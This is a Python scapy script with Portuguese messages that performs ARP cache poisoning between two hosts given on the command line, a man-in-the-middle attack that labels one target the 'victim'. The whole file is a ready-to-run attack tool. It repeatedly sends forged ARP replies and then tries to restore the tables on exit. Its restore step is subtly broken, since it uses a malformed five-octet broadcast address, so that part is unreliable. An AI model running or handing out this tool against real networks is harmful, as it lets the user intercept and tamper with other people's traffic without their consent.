#!/usr/bin/python
import sys, os, time

from scapy import *

def get_original_macs(ip):
  ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),timeout=2)
  for snd,rcv in ans:
    return rcv.sprintf("%Ether.src%")

def estado_original(spoofed_ip, vitima, spoofed_mac, vitima_mac):
  send(ARP(op=2, psrc=spoofed_ip, pdst=vitima, hwdst="ff:ff:ff:ff:ff", hwsrc=spoofed_mac))
  send(ARP(op=2, psrc=vitima, pdst=spoofed_ip, hwdst="ff:ff:ff:ff:ff", hwsrc=vitima_mac))

def arp_poison(spoofed_ip, vitima):
  send(ARP(op=2, psrc=spoofed_ip, pdst=vitima, hwdst="ff:ff:ff:ff:ff:ff"))
  send(ARP(op=2, psrc=vitima, pdst=spoofed_ip, hwdst="ff:ff:ff:ff:ff:ff"))

def main():
  if os.geteuid() != 0:
    print("Execute como super usuario.")
    exit()

  if len(sys.argv) != 3:
    print (("Use: %s <O IP falso> <IP do spoof>") % (sys.argv[0]))
    exit()

  print(("Invenenando IP = %s") % (sys.argv[2]))
  print(("\nSeu IP falso %s")%(sys.argv[1]))
  print("\nAperte ctrl+c para sair.")

  try:
    spoofed_mac = get_original_macs(sys.argv[1])
    vitima_mac  = get_original_macs(sys.argv[2])
  except:
    print("Erro: Desativado para pegar o MAC, Saindo.")
    exit(1)

  while 1:
    try:
      arp_poison(sys.argv[1], sys.argv[2])
      time.sleep(2)
    except KeyboardInterrupt:
      print("Interrupcao de teclado\nRestaurando a Rede e saindo...")
      estado_original(sys.argv[1], sys.argv[2], spoofed_mac, vitima_mac)
      exit(0)

if __name__ == "__main__":
  main()
